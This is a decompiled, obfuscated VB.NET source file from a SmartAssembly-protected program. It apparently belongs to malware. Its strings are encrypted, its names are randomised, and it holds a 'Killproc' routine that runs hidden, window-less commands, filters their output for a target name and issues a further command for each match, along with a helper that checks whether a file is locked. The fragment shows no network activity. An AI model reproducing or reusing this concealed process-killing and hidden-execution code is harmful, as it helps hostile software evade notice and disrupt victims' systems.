Imports System
Imports System.Collections.Generic
Imports System.Diagnostics
Imports System.IO
Imports System.Linq
Imports System.Text
Imports SmartAssembly.Delegates
Imports SmartAssembly.HouseOfCards

Namespace frgoWklvEOSV
	' Token: 0x0200000D RID: 13
	Friend NotInheritable Class NqaDDCCMEbCxV
		' Token: 0x0600003F RID: 63 RVA: 0x0000BF58 File Offset: 0x0000A158
		Public Shared Function SmlSZjnRIeVP(string_0 As String) As Boolean
			Dim fileStream As FileStream = Nothing
			Try
				fileStream = File.Open(string_0, FileMode.Open, FileAccess.ReadWrite, FileShare.None)
			Catch ex As UnauthorizedAccessException
				Try
					fileStream = File.Open(string_0, FileMode.Open, FileAccess.Read, FileShare.None)
				Catch ex2 As Exception
					Return True
				End Try
			Catch ex3 As Exception
				Return True
			Finally
				fileStream.Close()
			End Try
			Return False
		End Function

		' Token: 0x06000040 RID: 64 RVA: 0x0000BFCC File Offset: 0x0000A1CC
		Public Shared Sub XkoarExxofRiBeK(string_0 As String)
			Dim func As Func(Of String, Boolean) = Nothing
			Dim mmvNUPMEkYcFz As NqaDDCCMEbCxV.mmvNUPMEkYcFz = New NqaDDCCMEbCxV.mmvNUPMEkYcFz()
			mmvNUPMEkYcFz.fmfdAkvSVbMP = string_0
			Try
				Dim text As String = NqaDDCCMEbCxV.oLflouHqkSEuZ(PFruJiQrcriiZ.GwTsezEgVAuVAU(NqaDDCCMEbCxV.getString_0(107403123)), PFruJiQrcriiZ.GwTsezEgVAuVAU(NqaDDCCMEbCxV.getString_0(107403138)))
				Dim array As String() = New String() { NqaDDCCMEbCxV.getString_0(107396319) }
				Dim array2 As String() = text.Split(array, StringSplitOptions.None)
				Dim enumerable As IEnumerable(Of String) = array2
				If func Is Nothing Then
					func = AddressOf mmvNUPMEkYcFz.<Killproc>b__4
				End If
				Dim enumerable2 As IEnumerable(Of String) = enumerable.Where(func)
				If NqaDDCCMEbCxV.CS$<>9__CachedAnonymousMethodDelegate8 Is Nothing Then
					NqaDDCCMEbCxV.CS$<>9__CachedAnonymousMethodDelegate8 = AddressOf NqaDDCCMEbCxV.<Killproc>b__5
				End If
				Dim enumerable3 As IEnumerable(Of String()) = enumerable2.[Select](NqaDDCCMEbCxV.CS$<>9__CachedAnonymousMethodDelegate8)
				If NqaDDCCMEbCxV.CS$<>9__CachedAnonymousMethodDelegate9 Is Nothing Then
					NqaDDCCMEbCxV.CS$<>9__CachedAnonymousMethodDelegate9 = AddressOf NqaDDCCMEbCxV.<Killproc>b__6
				End If
				Dim list As List(Of String) = enumerable3.[Select](NqaDDCCMEbCxV.CS$<>9__CachedAnonymousMethodDelegate9).ToList()
				For Each text2 As String In list
					NqaDDCCMEbCxV.oLflouHqkSEuZ(PFruJiQrcriiZ.GwTsezEgVAuVAU(NqaDDCCMEbCxV.getString_0(107387813)), PFruJiQrcriiZ.GwTsezEgVAuVAU(NqaDDCCMEbCxV.getString_0(107403113)) + text2)
				Next
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000041 RID: 65 RVA: 0x0000C140 File Offset: 0x0000A340
		Public Shared Function oLflouHqkSEuZ(string_0 As String, string_1 As String) As String
			Dim text3 As String
			Try
				Dim process As Process = Process.Start(New ProcessStartInfo(string_0, string_1) With { .RedirectStandardOutput = True, .RedirectStandardError = True, .StandardOutputEncoding = Encoding.GetEncoding(NqaDDCCMEbCxV.getString_0(107403064)), .WindowStyle = ProcessWindowStyle.Hidden, .UseShellExecute = False, .CreateNoWindow = True })
				Dim text As String
				Using standardOutput As StreamReader = process.StandardOutput
					text = standardOutput.ReadToEnd()
				End Using
				Dim text2 As String
				Using standardError As StreamReader = process.StandardError
					text2 = standardError.ReadToEnd()
				End Using
				process.WaitForExit()
				text3 = text2 + text
			Catch ex As Exception
				text3 = ex.Message + NqaDDCCMEbCxV.getString_0(107403055) + ex.StackTrace
			End Try
			Return text3
		End Function

		' Token: 0x06000043 RID: 67 RVA: 0x0000C23C File Offset: 0x0000A43C
		Private Shared Function <Killproc>b__5(string_0 As String) As String()
			Return string_0.Split(New Char() { ","c })
		End Function

		' Token: 0x06000044 RID: 68 RVA: 0x00002814 File Offset: 0x00000A14
		Private Shared Function <Killproc>b__6(string_0 As String()) As String
			Return string_0(1).Replace(NqaDDCCMEbCxV.getString_0(107387773), NqaDDCCMEbCxV.getString_0(107388726))
		End Function

		' Token: 0x06000045 RID: 69 RVA: 0x0000283C File Offset: 0x00000A3C
		' Note: this type is marked as 'beforefieldinit'.
		Shared Sub New()
			Strings.CreateGetStringDelegate(GetType(NqaDDCCMEbCxV))
			NqaDDCCMEbCxV.XjjKqGKaaiFFD = New List(Of String)()
			NqaDDCCMEbCxV.VJCdOgLUhSBh = New List(Of String)()
		End Sub

		' Token: 0x04000088 RID: 136
		Public Shared XjjKqGKaaiFFD As List(Of String)

		' Token: 0x04000089 RID: 137
		Public Shared VJCdOgLUhSBh As List(Of String)

		' Token: 0x0400008A RID: 138
		Private Shared CS$<>9__CachedAnonymousMethodDelegate8 As Func(Of String, String())

		' Token: 0x0400008B RID: 139
		Private Shared CS$<>9__CachedAnonymousMethodDelegate9 As Func(Of String(), String)

		' Token: 0x0400008C RID: 140
		<NonSerialized()>
		Friend Shared getString_0 As GetString

		' Token: 0x0200000E RID: 14
		Private NotInheritable Class mmvNUPMEkYcFz
			' Token: 0x06000047 RID: 71 RVA: 0x00002861 File Offset: 0x00000A61
			Public Function <Killproc>b__4(string_0 As String) As Boolean
				Return string_0.Contains(Me.fmfdAkvSVbMP)
			End Function

			' Token: 0x0400008D RID: 141
			Public fmfdAkvSVbMP As String
		End Class
	End Class
End Namespace
